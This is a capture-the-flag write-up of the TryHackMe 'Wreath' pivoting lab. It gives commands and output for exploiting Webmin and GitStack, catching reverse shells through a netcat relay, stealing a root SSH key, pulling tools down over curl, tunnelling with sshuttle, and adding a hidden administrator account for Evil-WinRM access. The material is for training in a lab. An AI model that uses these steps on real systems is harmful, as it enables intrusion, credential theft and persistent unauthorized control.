# Wreath - TryHackMe

> **Kill Chain Summary**: Compromise an edge CentOS web server (`10.200.180.200`) hosting Webmin 1.890 via an unauthenticated parameter injection vulnerability (`CVE-2019-15107`) to gain an immediate root shell and harvest the administrative SSH private key. Transfer a statically compiled Nmap binary to the compromised edge host to scan the internal subnet (`10.200.180.0/24`), discovering an internal Windows host (`10.200.180.150`) running GitStack 2.3.10 and WinRM. Establish a network bridge using `sshuttle` through the edge host, exploit an unauthenticated RCE flaw in GitStack via Python, open port 22222 on the CentOS edge firewall to host a netcat relay, catch a reverse shell as `NT AUTHORITY\SYSTEM`, and add a privileged user to the `Remote Management Users` group to obtain persistent remote administrative access via Evil-WinRM.

| Property | Value |
| --- | --- |
| **Target Name** | Wreath |
| **Platform** | TryHackMe |
| **OS** | Linux (CentOS 8) / Windows (Dual-Host Pivoting Lab) |
| **Difficulty** | Hard |
| **Status** | Rooted |
| **Key Techniques** | Multi-Host Pivoting, Webmin 1.890 Unauthenticated RCE (CVE-2019-15107), SSH Key Harvesting, Static Binary Deployment, Internal Subnet Scanning, SSHuttle Tunneling, GitStack 2.3.10 Unauthenticated RCE (CVE-2018-5955), CentOS Firewall Modification (firewall-cmd), Netcat Pivot Relay, Evil-WinRM, Ligolo-ng Architecture |

---

## 1. Reconnaissance and Enumeration

### Perimeter Host TCP Port Scanning (10.200.180.200)

Initial network reconnaissance targeted the publicly accessible perimeter gateway host:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_$IP $IP
```

A subsequent targeted range scan uncovered additional service ports:

```bash
nmap -p-15000 -vv 10.200.180.200 -oG initial-scan
nmap -sV -p 22,80,443,9090,10000 10.200.180.200
```

**Perimeter Host Port Scan Results:**

| Port | Service | Version / Details | Operational Role |
| --- | --- | --- | --- |
| **22/tcp** | ssh | OpenSSH 8.0 (protocol 2.0) | Secure Shell Administration |
| **80/tcp** | http | Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c) | Redirects to `https://thomaswreath.thm` |
| **443/tcp** | ssl/http | Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c) | Thomas Wreath Portfolio Web App |
| **9090/tcp** | closed | zeus-admin | Closed administrative port |
| **10000/tcp** | http | MiniServ 1.890 (Webmin httpd) | Webmin System Management Interface |

### Perimeter Web Application Enumeration

Navigating to `http://10.200.180.200` triggers an automatic redirect to `https://thomaswreath.thm`:

![[Pasted image 20260720200158.png]]

The hostname was mapped locally in `/etc/hosts`:

```text
10.200.180.200  thomaswreath.thm
```

Inspecting port 10000 identified **MiniServ 1.890**, the underlying web server for Webmin:

![[Pasted image 20260720202819.png]]

Searching public vulnerability databases for MiniServ 1.890 identified **CVE-2019-15107**, an unauthenticated remote code execution vulnerability residing in the `password_change.cgi` script when the password change feature is enabled.

---

## 2. Initial Access

### Exploiting Webmin 1.890 (CVE-2019-15107)

The vulnerability arises due to improper sanitization of the `user` parameter in `password_change.cgi`, allowing an unauthenticated remote attacker to execute arbitrary shell commands with root privileges:

```bash
./CVE-2019-15107.py 10.200.180.200
```

Execution output:

```text
[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://10.200.180.200:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!
[+] The target is vulnerable and a pseudoshell has been obtained.
# whoami
root
```

### Reverse Shell Stabilization and SSH Key Harvesting

To obtain a persistent, fully interactive terminal session, a reverse shell was initiated from the exploit console:

```bash
# On Kali:
nc -lvnp 4444
```

```text
# On target pseudoshell:
shell
Please enter the IP address for the shell: 10.250.180.10
Please enter the port number for the shell: 4444
```

Connection received on Kali:

```bash
connect to [10.250.180.10] from (UNKNOWN) [10.200.180.200] 50534
whoami
root

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Inspecting `/root/.ssh/` revealed an unencrypted RSA private key:

```bash
cat /root/.ssh/id_rsa
```

```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
-----END OPENSSH PRIVATE KEY-----
```

The key was saved locally to `key`, permissions restricted (`chmod 600 key`), and a direct SSH connection was established:

```bash
ssh -i key root@10.200.180.200
```

Root access was verified on `prod-serv`.

---

## 3. Privilege Escalation

### Internal Network Reconnaissance

Having full root control over the perimeter host `10.200.180.200`, the next objective was discovering hosts located inside the internal subnet (`10.200.180.0/24`).

Because CentOS 8 did not contain network scanning utilities, a statically compiled Nmap binary was transferred from the attack machine:

```bash
# On Kali:
python3 -m http.server 1656
```

```bash
# On prod-serv (10.200.180.200):
curl http://10.250.180.10:1656/nmap-have2Fire -o /tmp/nmap-have2fire
chmod +x /tmp/nmap-have2fire
```

A ping sweep was executed across the `/24` subnet:

```bash
/tmp/nmap-have2fire -sn 10.200.180.0/24 -oN /tmp/scan-network
```

**Discovered Live Hosts:**
- `10.200.180.1` (Gateway / AWS infrastructure)
- `10.200.180.100` (All ports filtered by host firewall)
- `10.200.180.150` (Active internal host)
- `10.200.180.200` (Current pivot host)
- `10.200.180.250` (Infrastructure / DNS)

### Port Scanning Internal Host (10.200.180.150)

A targeted SYN port scan was performed against `10.200.180.150`:

```bash
/tmp/nmap-have2fire -p- -sS --min-rate 1000 -T4 -Pn 10.200.180.150
```

**Scan Results for 10.200.180.150:**

| Port | State | Service |
| --- | --- | --- |
| **80/tcp** | open | http |
| **3389/tcp** | open | ms-wbt-server (RDP) |
| **5985/tcp** | open | wsman (WinRM) |

The open ports indicated a Windows server hosting an HTTP service, RDP, and WinRM.

### Network Routing via SSHuttle

To route traffic from the attack machine directly to `10.200.180.150` through the compromised CentOS host, `sshuttle` was deployed:

```bash
sshuttle -r root@10.200.180.200 --ssh-cmd "ssh -i key" 10.200.180.150
```

With the route established, navigating to `http://10.200.180.150` in the browser became possible:

![[Pasted image 20260721225423.png]]

Following the application redirect paths brought up the GitStack application interface:

![[Pasted image 20260721225500.png]]

### Exploiting GitStack 2.3.10 (CVE-2018-5955)

The target host was running **GitStack 2.3.10**. Searching Exploit-DB revealed a known unauthenticated remote code execution vulnerability:

```bash
searchsploit gitstack
```

Exploit `43777.py` targets an unauthenticated REST API endpoint, injecting a PHP backdoor into the web root to execute system commands:

```bash
python2 43777.py
```

Execution output:

```text
[+] Get user list
[+] Found user twreath
[+] Web repository already enabled
[+] Get repositories list
[+] Found repository Website
[+] Add user to repository
[+] Disable access for anyone
[+] Create backdoor in PHP
[+] Execute command
"nt authority\system"
```

The script successfully executed commands as `NT AUTHORITY\SYSTEM`.

### Addressing Network Isolation with a Pivot Relay

Attempting to execute a reverse shell connecting directly from `10.200.180.150` to the attack machine (`10.250.180.10`) timed out:

```text
Pinging 10.250.180.10 with 32 bytes of data:
Request timed out.
Request timed out.
Packets: Sent = 3, Received = 0, Lost = 3 (100% loss)
```

The internal Windows host (`10.200.180.150`) does not possess an outbound route to the external VPN network. It can only communicate with the local subnet (`10.200.180.0/24`).

**Pivot Solution: Establishing a Relay on the Perimeter Host (`10.200.180.200`)**

1. **Firewall Modification**: The default `firewalld` on CentOS 8 blocks inbound traffic on arbitrary high ports. Port 22222 was explicitly permitted:

```bash
# On prod-serv (10.200.180.200):
firewall-cmd --zone=public --add-port 22222/tcp
```

2. **Netcat Listener Setup**:
A static netcat binary was uploaded to `10.200.180.200` to listen on port 22222:

```bash
./nc -lvnp 22222
```

3. **Triggering the Reverse Shell**:
The GitStack exploit command payload was modified to send a PowerShell reverse shell to the pivot host at `10.200.180.200:22222`:

```bash
python2 43777.py
```

The netcat listener on `10.200.180.200` caught the reverse shell:

```text
connect to [10.200.180.200] from (UNKNOWN) [10.200.180.150] 49777
whoami
nt authority\system
PS C:\GitStack\gitphp>
```

### Establishing Persistent Remote Management Access (Evil-WinRM)

Operating through an interactive reverse shell relayed across multiple hops can be unstable. With `NT AUTHORITY\SYSTEM` access and WinRM open on port 5985, a local administrative account was provisioned:

```powershell
net user have2Fire have2Fire /add
net localgroup "Remote Management Users" have2Fire /add
net localgroup "Administrators" have2Fire /add
```

From Kali, using the active `sshuttle` tunnel, Evil-WinRM connected directly to `10.200.180.150`:

```bash
evil-winrm -i 10.200.180.150 -u have2Fire -p have2Fire
```

```text
*Evil-WinRM* PS C:\Users\have2Fire\Documents> whoami
git-serv\have2fire
```

Full administrative access was secured across the internal Windows host.

---

## 4. Useful Commands Summary

```bash
# Webmin CVE-2019-15107 Unauthenticated RCE Exploit
python3 CVE-2019-15107.py 10.200.180.200

# Subnet Discovery with Static Nmap
./nmap-static -sn 10.200.180.0/24 -oN subnet_discovery.txt

# Routing Internal Subnets via Sshuttle
sshuttle -r root@10.200.180.200 --ssh-cmd "ssh -i key" 10.200.180.150

# Managing Firewalld on CentOS Edge Hosts
firewall-cmd --zone=public --add-port 22222/tcp
firewall-cmd --zone=public --list-ports

# GitStack 2.3.10 Unauthenticated RCE Exploit
python2 43777.py

# Windows User Provisioning for WinRM Access
net user [username] [password] /add
net localgroup "Remote Management Users" [username] /add
net localgroup "Administrators" [username] /add

# Connecting via Evil-WinRM Through Sshuttle Tunnel
evil-winrm -i 10.200.180.150 -u [username] -p [password]
```

---

## 5. Key Takeaways and Lessons Learned

1. **Firewall Rules on Linux Pivot Hosts**:
   When using a compromised Linux host as a network pivot, inbound reverse shells will fail if the local firewall (e.g., `firewalld` on RHEL/CentOS or `iptables` / `ufw` on Ubuntu) rejects unsolicited incoming packets. Always inspect active firewall zones (`firewall-cmd --list-all`) and open necessary listener ports before attempting to catch internal shells.

2. **Network Segmentation and Outbound Routing**:
   Internal subnets frequently lack direct routing or NAT to external VPN gateways. Attempting to catch a reverse shell directly on the external attack machine will fail silently. Always test basic network connectivity (`ping` or `Test-NetConnection`) from the internal target toward intermediate pivot hosts before troubleshooting payload syntax.

3. **Pivoting Tool Selection: Sshuttle vs Ligolo-ng**:
   - `sshuttle` works as a transparent proxy over SSH by manipulating local `iptables` / `pf` rules and forwarding TCP connections (and DNS). While fast for basic web browsing and simple scripts, it can struggle with complex protocols like RDP, raw UDP, or heavy multi-threaded connections.
   - `Ligolo-ng` establishes a dedicated `TUN` virtual network interface, encapsulating raw Layer 3 packets over a single TLS/TCP connection. It natively supports ICMP, UDP, TCP, and high-bandwidth traffic like RDP with substantially lower latency and higher connection stability.

4. **Strategic Tooling for OSCP**:
   Complex Command and Control (C2) frameworks such as Empire or Starkiller introduce unnecessary overhead, configuration friction, and operational fragility in time-constrained exam environments. Mastering lightweight, resilient command-line pivoting utilities (`Ligolo-ng`, `Chisel`, `sshuttle`, and standard SSH dynamic port forwarding) provides maximum control, repeatability, and reliability.

---

#thm #linux #centos #windows #pivoting #multi-host #webmin #cve-2019-15107 #ssh-key #nmap-static #sshuttle #gitstack #cve-2018-5955 #firewall-cmd #netcat-relay #evil-winrm #ligolo-ng #hard
